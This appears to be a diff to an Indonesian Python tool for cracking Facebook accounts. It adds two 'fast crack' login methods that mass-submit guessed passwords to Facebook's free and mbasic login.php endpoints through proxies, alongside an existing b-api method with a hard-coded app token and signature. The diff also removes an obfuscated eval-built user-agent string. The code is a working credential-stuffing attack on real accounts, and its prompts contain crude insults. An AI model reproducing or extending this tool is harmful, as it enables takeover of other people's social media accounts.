@@ -40,15 +40,16 @@ class crack:
 			print(" 1. method b-api (fast crack)")
 			print(" 2. method free.facebook (slow crack)")
 			print(" 3. method mbasic.facebook (slow crack)")
-			#print(" 4. method m.facebook (slow crack)")
+			print(" 4. method api free.facebook (fast crack)")
+			print(" 5. method api mbasic.facebook (fast crack)")
 			self.awokawok_ngentod(password)
-			#self.awokawok_ngentod(password.split(","))
 		if NAROSKEUN in tuple("tT"):
 			print(" * pilih method login")
 			print(" 1. method b-api (fast crack)")
 			print(" 2. method free.facebook (slow crack)")
 			print(" 3. method mbasic.facebook (slow crack)")
-			#print(" 4. method m.facebook (slow crack)")
+			print(" 4. method api free.facebook (fast crack)")
+			print(" 5. method api mbasic.facebook (fast crack)")
 			self.awokawok_ngentod()
 		else:
 			print(" ! isi yang bener ngentod");self.naroskeun()
@@ -69,32 +70,18 @@ class crack:
 		ses.post(url+action,data=data,proxies=dict(http=proxsi),allow_redirects=False)
 		return ses.cookies.get_dict()
 	
-	def fckyu(self,username,password,url,**data):
+	def api(self,username,password,url,**data):
 		ses=req.session()
-		ses.headers.update({"Host":url.split("//")[1],"upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
-		parsing=parser(respon.text,"html.parser")
-		action=parsing.find("form",{"method":"post"})["action"]
-		dtsg=re.findall('{"dtsg":{"token":"(.*?)"',respon.text)
-		time=int(datetime.now().timestamp())
-		kecuali=["sign_up","_fb_noscript"]
-		for INPUT in parsing.find_all("input",{"value":True}):
-			if INPUT["name"] in kecuali:
-				continue
-			else:
-				data.update({INPUT["name"]:INPUT["value"]})
-		data.update({"email":username,"pass":password,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true"})
-		if dtsg:
-			data.update({"fb_dtsg":dtsg[0]})
-		ses.headers.update({"cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
-		ses.post(url+action,data=data,allow_redirects=False)
+		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login.php","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg})
+		data.update({"email":username,"pass":password,"login":"submit"})
+		ses.post(url+"/login.php",data=data,proxies=dict(http=proxsi),allow_redirects=False)
 		return ses.cookies.get_dict()
-	
+
 	def bapi(self,username,password):
 		ses=req.session()
 		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":ghbbjiuGghgYyhhhjjjjjhyhhgtujnkkkiDghgtjkiukloudgjbfjii76jhghvfjjjko9ihfddfzayjhfujgjkhhjhunhgkhui77577u6jjghhfhkhhnhgghh__jjthjgkoio9yrkfjyhgryutiuuykkooyshjbvdeaathhf__hhvvvbnnnnmjhewyjheyjhhgttr665yhhjjghjgdsfjnnjDgggdgghyyjhhhhhyyyyyyyyatggg,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
 		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
-		return ses.get("https://b-api.facebook.com/method/auth.login",proxies=dict(http=proxsi)).json()
+		return ses.get("https://b-api.facebook.com/method/auth.login").json()
 	
 	def awokawok_ngentod(self,manual=None):
 		pilih=input(" ? pilih : ")
@@ -120,10 +107,16 @@ class crack:
 			tod=self.awikwok()
 			self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
 			self.result()
-		#if pilih in ("4","04"):
-			#tod=self.awikwok()
-			#self.attack(self.fckyu,speed,manual,url.format("m"),tod)
-			#self.result()
+		if pilih in ("4","04"):
+			print(" * token found :D" if self.token else " ! token not found")
+			tod=self.awikwok()
+			self.attack(self.api,speed,manual,url.format("free"),tod)
+			self.result()
+		if pilih in ("5","05"):
+			print(" * token found :D" if self.token else " ! token not found")
+			tod=self.awikwok()
+			self.attack(self.api,speed,manual,url.format("mbasic"),tod)
+			self.result()
 		else:
 			print(" ! isi yang bener ngentod");self.awokawok_ngentod(manual)
 			
@@ -137,7 +130,7 @@ class crack:
 				else:
 					kumpul.append({"username":membagi[0],"password":password.split(",")})
 			else:
-				kumpul.append({"username":membagi[0],"password":pw_list(membagi)})
+				kumpul.append({"username":membagi[0],"password":pw_list(membagi,login)})
 		print(" * crack started\n * press ctrl+z to stop\n")
 		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
 			if "bapi" in str(login):
@@ -181,7 +174,7 @@ class crack:
 					cp+=1
 					uid=username
 					if "request_args" in rincian:
-						# menghindari nyasar :v
+						# menghindari nyasar maybe :v
 						for x in rincian["request_args"]:
 							if "email" in x["key"]:
 								uid=x["value"];break
@@ -223,4 +216,3 @@ class crack:
 			else:
 				print(" ! isi yang bener ngentod")
 				return self.awikwok()
-			
